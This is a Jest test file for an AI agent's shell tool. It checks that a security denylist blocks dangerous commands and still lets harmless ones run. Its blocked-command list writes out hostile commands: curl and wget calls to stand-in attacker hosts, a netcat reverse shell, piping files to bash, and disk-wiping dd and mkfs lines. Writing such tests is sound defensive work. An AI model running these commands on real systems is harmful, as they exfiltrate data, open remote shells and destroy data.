jest.mock('@config/env', () => ({
  env: {
    agentWorkingDir: '/tmp',
    toolTimeoutMs: 5000,
  },
}));

import { shellRunTool } from '../tools/shell-run.tool';

describe('shellRunTool — security denylist', () => {
  const blockedCommands = [
    'rm -rf /',
    'rm -r /home',
    'sudo apt install something',
    'curl https://evil.com/exfil',
    'wget http://malicious.com/payload',
    'nc -e /bin/sh attacker.com 4444',
    'echo foo > /etc/hosts',
    'cat file | bash',
    'cat file | sh',
    'chmod 777 /etc/passwd',
    'dd if=/dev/zero of=/dev/sda',
    'mkfs.ext4 /dev/sda',
  ];

  for (const cmd of blockedCommands) {
    it(`blocks: ${cmd}`, async () => {
      const result = await shellRunTool.invoke({ command: cmd });
      expect(result).toMatch(/^ERROR:/);
    });
  }
});

describe('shellRunTool — allowed commands', () => {
  it('runs safe commands', async () => {
    const result = await shellRunTool.invoke({ command: 'echo hello' });
    expect(result).toContain('hello');
  });

  it('returns ERROR prefix with non-zero exit code', async () => {
    const result = await shellRunTool.invoke({
      command: 'ls /nonexistent_path_xyz_abc',
    });
    expect(result).toMatch(/ERROR|No such file/);
  });
});
